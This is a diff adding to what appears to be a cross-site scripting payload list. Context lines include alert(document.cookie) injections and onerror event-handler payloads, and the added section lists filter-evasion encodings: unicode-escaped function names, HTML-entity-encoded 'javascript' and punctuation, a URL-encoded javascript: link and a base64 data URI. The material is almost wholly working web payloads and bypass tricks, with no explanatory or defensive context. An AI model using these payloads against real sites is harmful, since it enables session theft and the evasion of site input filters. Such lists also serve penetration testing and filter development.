@@ -523,3 +523,19 @@ foo\’; alert(document.cookie);//’;
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
 <video src=1 onerror=alert(1)>
 <audio src=1 onerror=alert(1)>
+
+
+##################################################
+#########Some alternative useful keywords:########
+##################################################
+
+
+alert = a\u006cer\u0074
+prompt = p\u0072om\u0070\u0074
+confirm = co\u006efir\u006d
+javascript = j&#x00041vascr&#x00069pt
+: = &colon;
+( = &lpar;
+) = &rpar;
+using alert(/xss/) in a link = alert%28 /xss/%29 example: <a href=”javascript:alert%28 /xss/%29″>clickme
+base64 alert(2) = data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
